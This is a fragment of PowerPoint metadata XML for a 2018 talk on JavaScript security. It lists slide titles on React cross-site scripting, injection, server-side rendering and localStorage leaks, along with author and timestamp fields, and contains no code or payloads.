      <thm15:themeFamily xmlns:thm15="http://schemas.microsoft.com/office/thememl/2012/main" name="Default Theme" id="{6D1F9C5A-2AEA-433E-9F31-B7D4577B66E9}" vid="{EBCC1F61-21FD-4864-9BE9-BDE6511C7A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5322</TotalTime>
  <Words>1837</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>384</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Arial Black</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Default Theme</vt:lpstr>
      <vt:lpstr>How to                      to JavaScript [In]Security</vt:lpstr>
      <vt:lpstr>whoami</vt:lpstr>
      <vt:lpstr>Agenda</vt:lpstr>
      <vt:lpstr>Agenda</vt:lpstr>
      <vt:lpstr>State of the Client-Side JavaScript Field Today</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Frameworks, what about them?</vt:lpstr>
      <vt:lpstr>Client-side JavaScript Security Concerns</vt:lpstr>
      <vt:lpstr>Server-side JavaScript Security Concerns</vt:lpstr>
      <vt:lpstr>Align Client-Side JavaScript with OWASP Top 10 </vt:lpstr>
      <vt:lpstr>JavaScript Frameworks Security</vt:lpstr>
      <vt:lpstr>React</vt:lpstr>
      <vt:lpstr>Why React?</vt:lpstr>
      <vt:lpstr>React History</vt:lpstr>
      <vt:lpstr>React Overview</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting</vt:lpstr>
      <vt:lpstr>Expression Injection vs Component Injection</vt:lpstr>
      <vt:lpstr>Dynamically Created Components – Part I</vt:lpstr>
      <vt:lpstr>Dynamically Created Components – Part II</vt:lpstr>
      <vt:lpstr>Attribute Injections</vt:lpstr>
      <vt:lpstr>XSS via JavaScript URI Demo</vt:lpstr>
      <vt:lpstr>XSS with Markdown </vt:lpstr>
      <vt:lpstr>XSS with Markdown Demo</vt:lpstr>
      <vt:lpstr>Server Side Rendering</vt:lpstr>
      <vt:lpstr>Server Side Rendering</vt:lpstr>
      <vt:lpstr>XSS with Server Side Rendering Demo</vt:lpstr>
      <vt:lpstr>XSS in Redux</vt:lpstr>
      <vt:lpstr>Eval… Again?</vt:lpstr>
      <vt:lpstr>Communicating with Server</vt:lpstr>
      <vt:lpstr>Request Authentication</vt:lpstr>
      <vt:lpstr>Leaking Sensitive Data into localStorage</vt:lpstr>
      <vt:lpstr>Conclusions and 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Ksenia Peguero</dc:creator>
  <cp:lastModifiedBy>Ksenia Peguero</cp:lastModifiedBy>
  <cp:revision>391</cp:revision>
  <cp:lastPrinted>2018-03-28T15:49:32Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-01-18T19:13:05Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-05-21T15:19:35Z</dcterms:modified>
</cp:coreProperties>
</file>